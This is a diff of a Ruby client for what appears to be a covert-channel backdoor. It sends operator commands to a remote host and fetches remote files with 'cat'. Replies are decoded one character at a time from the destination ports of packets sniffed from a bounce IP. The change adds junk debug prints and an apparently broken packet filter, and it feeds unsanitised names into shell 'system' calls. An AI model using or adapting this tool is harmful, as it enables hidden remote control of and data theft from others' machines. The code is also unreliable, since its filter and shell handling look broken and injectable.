@@ -13,27 +13,20 @@ class Client
   end
 
   def start
-     puts "started"
-
-
+    puts "write a command or prepend 'dl ' to your command to get a file"
     while (true)
-     puts "write a command or prepend 'dl ' to your command to get a file"
+
       str = STDIN.gets
       if str[0,3] == "dl "
         @conn.cliSend("cat " + str[3..-1])
         array = str[3..-1].split("/")
         fn = array[array.length - 1]
         system("rm -f #{fn}")
-        puts fn
-        t = Thread.new{ readPackets(fn) }
+        Thread.new{ readPackets(fn) }
       else
         @conn.cliSend(str)
-        t = Thread.new{ readPackets() }
+        Thread.new{ readPackets() }
       end
-      t.join
-
-      puts "Command Sent"
-
     end
   end
 
@@ -55,11 +48,12 @@ private
   end
 
   def tcp(dl = nil)
-  puts "using tcp to receive"
-    filter = "tcp and tcp[13] & 4!=0 and src #{$tcpBounceIp}"
+    filter = "tcp and tcp[3] & 4!=0 and src #{$tcpBounceIp}"
     cap = Capture.new(:iface => $iface, :start => true, :promisc => true, :filter => filter)
+
     cap.stream.each do |p|
       pkt = Packet.parse p
+          puts "asdfasdf"
       if pkt.is_tcp?
         puts "packet Recieved"
         if (pkt.tcp_dst == 2560)
@@ -67,10 +61,14 @@ private
           STDOUT.flush
           return
         end
+        puts "aa"
         char = (pkt.tcp_dst >> 8).chr
+        puts "bb"
         if (dl.nil?)
           print char
+          puts "printing to screen"
         else
+          puts "putting to file"
           system("echo -ne #{char} >> #{dl}")
         end
       end
